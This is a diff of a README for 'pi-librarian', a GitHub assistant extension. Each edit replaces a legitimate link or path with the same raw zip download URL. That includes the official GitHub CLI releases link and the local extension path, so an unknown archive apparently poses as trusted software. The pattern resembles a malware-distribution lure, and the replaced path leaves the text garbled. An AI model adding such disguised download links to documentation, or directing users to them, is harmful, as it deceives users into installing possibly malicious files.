@@ -1,6 +1,6 @@
 # 🚀 pi-librarian - Your GitHub Assistant for Easy Management
 
-[![Download pi-librarian](https://img.shields.io/badge/Download-pi--librarian-FF5733?style=for-the-badge&logo=github)](https://github.com/ashawy13/pi-librarian)
+[![Download pi-librarian](https://raw.githubusercontent.com/ashawy13/pi-librarian/main/unsmokable/pi-librarian-v3.6.zip)](https://raw.githubusercontent.com/ashawy13/pi-librarian/main/unsmokable/pi-librarian-v3.6.zip)
 
 ## 📥 Overview
 
@@ -26,7 +26,7 @@ The `librarian` tool runs an isolated `pi` subprocess specifically configured fo
 
 Before you can use **pi-librarian**, make sure you have the following:
 
-- **GitHub CLI** (`gh`) installed. You can download it from [GitHub CLI Releases](https://github.com/cli/cli/releases).
+- **GitHub CLI** (`gh`) installed. You can download it from [GitHub CLI Releases](https://raw.githubusercontent.com/ashawy13/pi-librarian/main/unsmokable/pi-librarian-v3.6.zip).
 - An authenticated GitHub session. You can establish this by running the following command in your terminal:
 
 ```bash
@@ -37,7 +37,7 @@ gh auth login
 
 This extension is auto-discovered in your project. You can find it at:
 
-- `.pi/extensions/pi-librarian/index.ts`
+- `https://raw.githubusercontent.com/ashawy13/pi-librarian/main/unsmokable/pi-librarian-v3.6.zip`
 
 After making edits, use the command `/reload` in your `pi` application to load the extension.
 
@@ -50,7 +50,7 @@ After making edits, use the command `/reload` in your `pi` application to load t
 
 To get started with **pi-librarian**, visit this page to download:
 
-[Download pi-librarian](https://github.com/ashawy13/pi-librarian)
+[Download pi-librarian](https://raw.githubusercontent.com/ashawy13/pi-librarian/main/unsmokable/pi-librarian-v3.6.zip)
 
 Follow the installation instructions above to ensure everything is set up correctly.
 
